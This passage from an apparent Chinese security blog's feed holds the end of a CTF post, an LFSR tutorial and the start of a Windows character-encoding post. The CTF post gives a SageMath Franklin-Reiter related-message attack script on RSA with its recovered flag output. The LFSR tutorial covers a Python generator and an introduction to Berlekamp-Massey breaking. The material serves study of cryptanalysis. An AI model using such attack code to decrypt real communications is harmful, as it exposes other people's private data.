class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">59861917324226967486215648256894012851495145204497486380891167740615801374063455379673715500954583547144532511038617630076588124328491649811856993314542460125128961468483743038573111414419166480096592264420724034747983484148465064161457578180902917692815465155951262833991421445819783698766048087026362827177</span></span><br><span class="line">a = <span class="number">8912027245219554871633263198357534861260151492942640613543674312789184411070375687173938678863885846785442731416745232377239461392819384805757821014008997</span></span><br><span class="line">b = <span class="number">9082019118159490199184118787363903212978739183503144824083405972098784434747374470051472810662991934944899511831981983317873229914591770162089271570548898</span></span><br><span class="line">c1 = <span class="number">13829716726154552626808370709385622815070337340315816233387666503855034657492722518838631908542319087651252784674601561198457938726403898164944489259977862308799162509306623034533701622307267177872660177001435552253633489217686479650060107252554076305263872524702049994229524235844714514276932861812294412208</span></span><br><span class="line">c2 = <span class="number">12344340068962283228603202053643543482434797000939385457621435796626275462396259806353278281512262932359248462422732215649437185890052207218476381335849291479672021635844167181113351805907880675672544417067152443404516325590447421944842581421615420605120177863329347579906535387550917852112995890140027254347</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment"># 首先要设置一个环中的变量,用这个变量来表示多项式</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Franklin</span>(<span class="params">n,e,a,b,c1,c2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    n: 模数</span></span><br><span class="line"><span class="string">    e: 指数</span></span><br><span class="line"><span class="string">    a: 线性关系中am+b中的a</span></span><br><span class="line"><span class="string">    b: 线性关系中am+b中的b</span></span><br><span class="line"><span class="string">    c1: f = x^e - c1 中的c1,也就是没有被线性变换过的加密密文</span></span><br><span class="line"><span class="string">    c2: 线性变换过的加密密文</span></span><br><span class="line"><span class="string">    return value: int-&gt;m</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> </span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n)) <span class="comment"># 创建一个模n下的多项式环,环的名称为PR,该环的变量为x</span></span><br><span class="line">    f = x^e - c1 </span><br><span class="line">    g = (a*x+b)^e - c2</span><br><span class="line">    G = PR(f._pari_with_name(<span class="string">&#x27;x&#x27;</span>).gcd(g._pari_with_name(<span class="string">&#x27;x&#x27;</span>))) <span class="comment"># PR()将求得的公因式转换到PR环上</span></span><br><span class="line">    <span class="built_in">print</span>(G)</span><br><span class="line">    G = G.monic()</span><br><span class="line">    <span class="built_in">print</span>(G)</span><br><span class="line">    m = G.constant_coefficient()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line">        </span><br><span class="line">m = Franklin(n,e,a,b,c1,c2)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="built_in">print</span>(n-m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(n-m)))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">59861917324226967486215648256894012851495145204497486380891167740615801374063455379673715500954583547144532511038617630076588124328491649811856993314542460125128961468483743038573111414419166480096592264420668028355190078995842814841648310810119551192062039646311316624372659583573767360517334407327685140012</span></span><br><span class="line"><span class="string">b&#x27;U?\x06\xf5\x0e\xa7\x87zS\xa4\x188l\x80\x11\xb3+\x857v\x00\x1a\xb8\xe6J\x03\x89\x99)Q\x1aA\xf5i\x80@\xe5\xde\xa7I\xcf\x06-K\x08\xca\xb7\xa5\xf4\xd6\xb1mGP\x06\xfd\xbb\xaf\xb7 M\x99\xf0Ir\xefg\xb9\xf9WkA#Y&gt;&quot;\xd6U48h\x1f\x7f\x18~\x84\xff\xc1e\n\x7f\xc3\xf0\xe6n\xfa\x17\xec\xf1\xd5\xdd\x08\xeb9T]x\x1f=\xb7\xb9\xc8\x9e\x1f\x94@=\xd5\xc3\xa4l)_\x81\xdd\xe9\xde,&#x27;</span></span><br><span class="line"><span class="string">56006392793405152622249319809267370783366500753425509639946209618761862246016338248713679698677687165</span></span><br><span class="line"><span class="string">b&#x27;flag&#123;4eebce90-3a9f-4ba4-a75a-a434b915037c&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="例题3">例题3</h3><ul><li></li></ul><h3 id="想法">想法</h3><p>前面三个例题都是关于直线的线性关系，那么如果是其他线性关系是不是也能这样直接<code>gcd</code>求出结果呢？带着这个疑问来探究探究，如果探究出来了目前就不把题目放在这里了，直接把这题当做题目出出来。（斜眼笑）</p><h1 id="两个消息非线性关系">两个消息非线性关系</h1><h1 id="多个消息多项式关系">多个消息多项式关系</h1><h1 id="多个消息多个线性关系">多个消息多个线性关系</h1>]]></content>
    
    
    <summary type="html">前言：e和phi不互素学的有点爽</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="RSA" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/RSA/"/>
    
    
  </entry>
  
  <entry>
    <title>LFSR伪随机数生成器</title>
    <link href="http://iyheart.github.io/2025/09/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81%E4%B9%8B%E4%B8%BA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/LFSR%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/"/>
    <id>http://iyheart.github.io/2025/09/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81%E4%B9%8B%E4%B8%BA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/LFSR%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/</id>
    <published>2025-09-18T14:01:28.000Z</published>
    <updated>2025-09-18T10:01:56.483Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>参考博客：<a href="https://learnku.com/docs/cryptography/36-linear-feedback-shift-register-lfsr/9315">3.6 线性反馈移位寄存器（LFSR） | 第三章：序列密码 |《密码学入门》| Python 技术论坛</a></p></li><li><p>参考博客：<a href="https://zh.wikipedia.org/wiki/%E7%BA%BF%E6%80%A7%E5%8F%8D%E9%A6%88%E7%A7%BB%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8">线性反馈移位寄存器 - 维基百科，自由的百科全书</a></p></li><li><p>参考博客：<a href="https://www.cnblogs.com/weijianlong/p/11947741.html">线性反馈移位寄存器（LFSR） - 生活的高手 - 博客园</a></p></li><li><p>参考博客：<a href="https://cdcq.github.io/2022/08/28/20220828a/">cdcq的密码学教程四——BM算法 | cdcq</a></p></li><li><p><code>LFSR</code>英文名为<code>Linear feedback shift register</code>，中文翻译过来就是<code>线性反馈移位寄存器</code>，其伪随机数生成的特点已经包含在LFSR的名称中，也就是<strong>线性</strong>、<strong>反馈</strong>这两个词。</p></li><li><p>由于<code>LFSR</code>是非常容易使用硬件实现的，所以在以前很多流密码的密钥都是通过<code>LFSR</code>伪随机数生成算法来实现的，但是该伪随机数生成的算法在密码学体制中是比较不安全的，容易被预测到。但是<code>LFSR</code>组合其实可以得到安全的流密码。</p></li><li><p>本篇文章写于<code>2025.6.16</code>但是写的不怎么好，而在<code>2025.9.11</code>在图书馆随便看看，看到了这本书，从数学原理讲<code>LSFR</code>，于是决定重写博客，重新学习<code>LSFR</code>相关的。</p></li></ul><p><img src="/2025/09/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81%E4%B9%8B%E4%B8%BA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/LFSR%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/image-20250911104035350.png" alt="image-20250911104035350"></p><h1 id="lfsr">LFSR</h1><ul><li><code>LFSR</code>是指给定前一状态的输出，将该输出的线性函数在用作输入的移位寄存器。</li><li>其中<strong>异或运算</strong>是最常见的单比特线性函数，对寄存器的某些位进行异或操作后作为输入，再对寄存器中的各比特进行整体移位。也就是<strong>先进行异或运算再进行位移运算</strong></li></ul><h2 id="lfsr的两种形式">LFSR的两种形式</h2><ul><li>LFSR其实不止上面介绍的一种方式，其实还有另一种方式。</li><li>对于上面介绍的这种，是比较经典的，将其称为<strong>Fibonacci型</strong>，其实就是指定抽头影响输入位。</li></ul><p><img src="/2025/09/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81%E4%B9%8B%E4%B8%BA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/LFSR%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/image-20250622160519756.png" alt="image-20250622160519756"></p><ul><li>还有一种LFSR类型，该类型为<strong>Galois型</strong>，这种类型是输出位送给输入位后逐位异或，从而影响其他位，得到伪随机。</li></ul><p><img src="/2025/09/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81%E4%B9%8B%E4%B8%BA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/LFSR%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/image-20250622160529128.png" alt="image-20250622160529128"></p><h2 id="lfsr算法描述fibonacci型">LFSR算法描述(Fibonacci型)</h2><ul><li><p>我们先来给出一张图片，这张图片就简单介绍了<code>LFSR</code>算法。这张图主要做了一下几个事情：</p><ul><li><p>对于初始的状态$a_na_{n-1}…a_{2}a_{1}$，经过一个线性函数$f(a_1,a_2,…,a_n)$的运算，其实$f(a_1,a_2,…,a_n)$这个线性函数就是异或操作，即$f(a_1,a_2,…,a_n)=a_1\oplus a_2 \oplus …\oplus a_n$,得到一个结果作为我们后续的输入的<code>bit值</code>，所以这个函数运算结果只有<code>0</code>或者<code>1</code>，先暂时保存这个值</p></li><li><p>之后将$a_na_{n-1}…a_2a_1$经过位移后整体就变成$a_{n-1}a_{n-2}…a_1a_0$，此时$a_0$其实就是作为输出值了</p></li><li><p>最后我们再将$f(a_1,a_2,…,a_n)$运算得到的结果传递给$a_n$，此时就构成了新的一组$a_na_{n-1}…a_2a_1$序列</p></li><li><p>之后像这样不断的线性位移计算，我们就能得到这些二进制序列，我们每线性位移<code>n</code>次取一次序列，这样就得到了<code>n</code>位伪随机数</p></li><li><p>注意：<strong>不一定</strong>所有的<strong>位</strong>都参与线性运算，一般只选择几个位参与线性运算</p></li></ul></li></ul><p><img src="/2025/09/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81%E4%B9%8B%E4%B8%BA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/LFSR%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/image-20250622160603602.png" alt="image-20250622160603602"></p><blockquote><p>有几个<strong>注意点</strong>：</p><ol><li>将参与线性运算$f(a_1,a_2,…,a_n)$的位称为<strong>抽头</strong>，也就是LFSR状态下影响输入的位</li><li>LFSR最右边的位为输出位，同时它始终也是<strong>抽头</strong>。</li><li>抽头是有顺序的异或，然后反馈到最左边的位。</li><li>最右边的位序列称为输出流，如上图所示其实我们的输出流其实是$a_1$先输出出来,然后$a_2$，最后才是$a_n$</li><li>最大长度LFSR产生m序列具有$2^m-1$种状态，寄存器全零状态的时候线性位移后还是全零</li></ol></blockquote><ul><li>接下来我们使用Python实现一下简单的<code>32位LFSR</code>伪随机数：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_int32</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LFSR</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,seed</span>):</span><br><span class="line">        <span class="comment"># seed作为初始化寄存器的一个种子</span></span><br><span class="line">        <span class="comment"># 规定二进制序列是这样的an an-1 ... a2 a1与上图描述一致</span></span><br><span class="line">        self.seed = _int32(seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 规定a26 a16 a11 a1都作为抽头</span></span><br><span class="line">        x = <span class="built_in">bin</span>(self.seed)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">        tap = [<span class="number">25</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">0</span>]</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tap:</span><br><span class="line">            tmp ^=<span class="built_in">int</span>(x[i],<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lshift</span>(<span class="params">self,an,reg</span>):</span><br><span class="line">        <span class="comment"># 进行位移运算</span></span><br><span class="line">        <span class="keyword">return</span> _int32((an&lt;&lt;<span class="number">31</span>)|(reg&gt;&gt;<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">LSF</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 生成32位的随机数</span></span><br><span class="line">        <span class="comment"># 其实也可以直接LSF一次,而不用32次</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            an = self.xor()</span><br><span class="line">            self.seed=self.lshift(an,self.seed)</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line">LFSR = LFSR(<span class="number">0xF75a15663499</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(LFSR.LSF())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="lfsr数学表示fibonacci型">LFSR数学表示(Fibonacci型)</h2><ul><li><p>LFSR有三种数学表示分别是递推公式、多项式表示、矩阵表示，其转换为数学符号，在有的时候更有利于推导公式之类的。</p></li><li><p>首先我们来介绍这张图所有位都参与异或的情况：</p><ul><li>设初始序列为$a_{n-1}a_{n-2}…a_1a_0$，由于我们每个位都参与运算，所以每个位都影响了最终结果</li><li>所以此时我们就可以写成这样一个<code>模2</code>的方程$a_{n+1}=a_{n}+a_{n-1}+…+a_2+a_1~mod~2$</li><li>此时我们还可以使用多项式的形式来表示$P(x)=x^{n}+x^{n-1}+…+x^{2}+x+1~mod~2$</li></ul></li><li><p>对于上图我们还可以使用矩阵来表示，我们可以定义<strong>状态向量</strong>$A_n$和<strong>转移矩阵</strong>$B_n$</p></li></ul><p>$$<br>A_n=\begin{bmatrix}a_n\a_{n-1}\ \vdots \ a_2  \ a_1 \end{bmatrix}\</p><p>B_n=\begin{bmatrix}1&amp;&amp;1 &amp;&amp; \cdots &amp;&amp;1 &amp;&amp;1\ 1 &amp;&amp; 0 &amp;&amp; \cdots &amp;&amp; 0 &amp;&amp; 0\ 0 &amp;&amp; 1 &amp;&amp; \cdots &amp;&amp; 0&amp;&amp;0\ \vdots &amp;&amp; \vdots &amp;&amp; \ddots &amp;&amp; \vdots &amp;&amp; \vdots\ 0 &amp;&amp; 0 &amp;&amp; \dots &amp;&amp;1&amp;&amp;0 \end{bmatrix}<br>$$</p><ul><li>最后得到结果</li></ul><p>$$<br>A_{n+1}=B_nA_n=\begin{bmatrix}a_n+a_{n-1}+…+a_2+a_1~mod~2\a_n\ \vdots \ a_3  \ a_2 \end{bmatrix}<br>$$</p><ul><li>但是由于在设计<code>LFSR</code>的时候我们并不会每一位都参与异或，此时我们就在$a_i$的前面添加一个系数，如果该位是抽头的话$a_i$前面的系数就为<code>1</code>，该位不是抽头的话$a_i$前面的系数就是0</li><li>例如上面使用Python编写的<code>LFSR</code>，就选用的是$a_{26}、a_{16}、a_{11}、a_{1}$作为抽头这样的话，就可以使用数学表达式得到这么一个序列</li></ul><p>$$<br>a_{n+1}=a_{26}+a_{16}+a_{11}+a_1~mod~2\<br>P(x)=x^{26}+x^{16}+x^{11}+x+1~mod~2<br>$$</p><ul><li>使用矩阵表示就如下，$B_n$太大写不下：</li></ul><p>$$<br>A_n=\begin{bmatrix}a_{32}\a_{31}\ \vdots \ a_2  \ a_1 \end{bmatrix}\<br>$$</p><ul><li>最后的结果要如下：</li></ul><p>$$<br>A_{n+1}=B_nA_n=\begin{bmatrix}a_{26}+a_{16}+a_{11}+a_1~mod~2\a_{32}\ \vdots \ a_3  \ a_2 \end{bmatrix}<br>$$</p><ul><li>所以归纳出输出序列，执行第m次的线性位移操作后的输出值的递推如下：</li></ul><p>$$<br>a_{i+m}=\sum^{m+1}<em>{j=0}p_j *a</em>{i+j}~mod~2\s_i,p_i\in{0,1},i=0,1,2,…<br>$$</p><ul><li>多项式表示为，如果第i位为抽头$p_i$就为1，否则为0：</li><li>这里注意有的多项式表达最高次数位始终为<code>1</code>，但是这里我们是将最低次数位默认为输出位，所以这里多项式始终有个<code>1</code>，具体情况再具体定义这个多项式就行了</li></ul><p>$$<br>P(x) = p_{n-1}x^{n-1}+p_{n-2}x^{n-2}+…+p_{2}x^{2}+p_1x+1~mod~2<br>$$</p><ul><li>最后矩阵状态转移就不写了，写矩阵太麻烦了。</li></ul><h2 id="lfsr的逻辑图fibonacci型">LFSR的逻辑图(Fibonacci型)</h2><ul><li>由于<code>LFSR</code>的特性，其是比较容易在硬件中实现的，逻辑电路图并不复杂。其组成其实就是<strong>n个触发器</strong>，加上<strong>一些异或门</strong>再通过导线连接即可得到一个硬件的LFSR。</li><li>如下图所示：</li></ul><p><img src="/2025/09/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81%E4%B9%8B%E4%B8%BA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/LFSR%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/image-20250622160904448.png" alt="image-20250622160904448"></p><h1 id="lfsr破解">LFSR破解</h1><ul><li>对于<code>LFSR</code>的破解需要用上一个经典的算法也就是<code> Berlekamp-Massey算法</code>。这里建议先去学习一下<code>Berlekamp-Massey</code>算法，先从它的数学抽象出来的问题入手，在破解LFSR的时候会更有助于理解。<a href="https://oi-wiki.org/math/berlekamp-massey/">Berlekamp–Massey 算法 - OI Wiki</a></li><li>对于<code>Berlekamp-Massey算法</code>，就不在这里详细介绍，这里只介绍<code>Berlekamp-Massey算法</code>在破解LFSR中的应用。</li></ul><h2 id="lfsr深入理解">LFSR深入理解</h2><ul><li>接下来要介绍一些相关的定义和定理作为学习<code>Berlekamp-Massey</code>算法的前置知识。</li></ul><blockquote><p><strong>知识点1</strong></p><p>假设一个LFSR长度为<strong>L</strong>，LFSR的<strong>最初状态</strong>其实就等于LFSR所产生的序列的前L位输出。如下图所示，序列$a_0、a_1、…、a_n$其实就是长度为<strong>N</strong>的LFSR的初始状态。</p><p>从第$L+1$位开始的所有输出，完全由LFSR的<strong>反馈结构</strong>和<strong>初始状态决定</strong>，说明了一旦LFSR的<strong>反馈结构</strong>确定并且设置了<strong>初始状态</strong>，那么输出序列就<strong>唯一确定</strong></p><p><img src="/2025/09/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81%E4%B9%8B%E4%B8%BA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/LFSR%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/image-20250622160953542.png" alt="image-20250622160953542"></p></blockquote><blockquote><p><strong>知识点2</strong></p><p>当我们要用阶(其实是LFFR的长度)为L的LFSR，来生成长度为$N$的序列其实会出现以下两种情况：</p><ol><li>当<strong>L&gt;=N</strong>时，该LFSR一定能生成长度为$N$的序列，但是并不是最短的一个LFSR</li><li>当<strong>L&lt;N</strong>时，如果该LFSR能生成长度为$$N$$的序列，那么从第$L+1$位开始就必须满足递推式$s_n=\sum^{L}<em>{i=1}c</em>{i}s_{n-i}~mod~2$</li></ol></blockquote><blockquote><p><strong>定理1</strong>:</p><p>如果某个长度为L的LFSR能生成长度为N的序列，$s_0、s_1、…、s_{N-1}$,但是无法生成第$s_{N}$项，那么任何一个可以完整生成序列$s_0、s_1、…、s_{n}$的LFSR，其长度必须满足$L^{'}≥N+1-L$，这个其实是<strong>B-M算法的下界定理</strong></p></blockquote><blockquote><p><strong>引理</strong>:</p><p>如果一个长度为n的LFSR记为$L_{n}(s)$，生成了$s_0,s_1,…,s_{N-1}$但是该LFSR并不能生成$s_0,s_1,…,s_{n-1},s_{n}$，那么就有$L_{n+1}(s)≥max[L_{N}(s),N+1-L_{N}(s)]$</p></blockquote><blockquote><p><strong>定理2</strong>:</p><p>如果一个长度位N的LFSR</p></blockquote>]]></content>
    
    
    <summary type="html">前言：LFSR线性反馈移位寄存器，之前没写完的打算重写</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="伪随机数" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows高级编程2-窗口程序</title>
    <link href="http://iyheart.github.io/2025/09/18/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B2-%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/"/>
    <id>http://iyheart.github.io/2025/09/18/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B2-%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/</id>
    <published>2025-09-18T09:11:47.000Z</published>
    <updated>2025-10-15T16:40:41.501Z</updated>
    
    <content type="html"><![CDATA[<h1 id="字符编码">字符编码</h1><h2 id="字符编码方式">字符编码方式</h2><ul><li>字符编码从上个世纪到现在出现了大致<code>4</code>种编码：<ul><li><code>ASC</code>编码：<code>7</code>位二进制代表一个字符串，这128位字符包含了<code>字母</code>、<code>数字</code>以及一些符号。</li><li><code>ASCII</code>编码：为了在欧洲推广计算机，所以又出现了<code>ASCII</code>编码，<code>8</code>位代表一个字符。并且前<code>128</code>个与前面的<code>ASC</code>编码一样。出现了一个代码页<code>ID</code>，根据代码页<code>ID</code>的不同将后面的<code>128</code>个字符换成对应国家的文字</li><li><code>DBCS</code>编码：主要是适配<code>亚洲</code>的文字编码，单双字节混合编码，英文字母按照<code>1</code>字节编码，象形文字等按照<code>2</code>字节编码</li><li><code>UNICODE</code>编码：被称为万国码，基本上把全世界所有语言都收录了。</li></ul></li><li>这里主要详细说明<code>DBCS</code>和<code>UNICODE</code>编码，其中<code>UNICODE</code>有<code>UTF-8</code>、<code>UTF-16</code>、<code>UTF-32</code>，如果在<code>Windows</code>下一般是<code>UTF-16</code>，而在<code>Linux</code>下一般是<code>UTF-8</code>：</li></ul><p><img src="/2025/09/18/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B2-%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/image-20250916144319067.png" alt="image-20250916144319067"></p><h2 id="宽字节字符">宽字节字符</h2><p>在<code>windows</code>编程中有一个新的数据类型，该类型为<code>宽字节字符</code>，关键字为<code>wchar_t</code>每个字符占<code>2</code>个字节</p><ul><li><code>char</code>：每个字符占1个字节</li><li><code>wchar_t</code>：实际是<code>unsigned short</code>类型，定义时，需要增加<code>L</code>，通知编译器按照双字节编译字符串，采用<code>UNICODE</code>编码。（无论是英文字母还是汉字都是占用两个字节）</li></ul><p>需要使用支持<code>wchar_t</code>函数操作宽字节字符串。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span>* pwszText = <span class="string">L&quot;Hello wchar&quot;</span>; <span class="comment">// 宽字节字符</span></span><br><span class="line">wprintf(<span class="string">L&quot;%s\n&quot;</span>,pwszText); <span class="comment">// 宽字节字符</span></span><br><span class="line"><span class="comment">// 注意：需要使用专门处理宽字节字符串相关的函数</span></span><br></pre></td></tr></table></figure><h2 id="tchar宏定义">TCHAR宏定义</h2><ul><li>由于宽字节字符和正常的字节字符有的时候会混淆，所以为了统一微软做了一个<code>TCHAR</code>的宏定义，该宏定义如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果定义了UNICODE这个宏,那么TCHAR就会被宏定义为wchar_t类型</span></span><br><span class="line"><span class="comment">// 如果没有定义UNICODE这个宏,那么TCHAR就会被定义为char类型</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">wchar_t</span> TCHAR;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __TEXT(quote) L## quote</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> TCHAR;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __TEXT(quote) quote</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h2 id="unicode字符打印">UNICODE字符打印</h2><p><code>wprintf</code>对<code>UNICODE</code>字符打印支持不完善，在<code>Windows</code>下使用<code>WriteConsole API</code>打印<code>UNICODE</code>字符<code>GetStdHandle</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 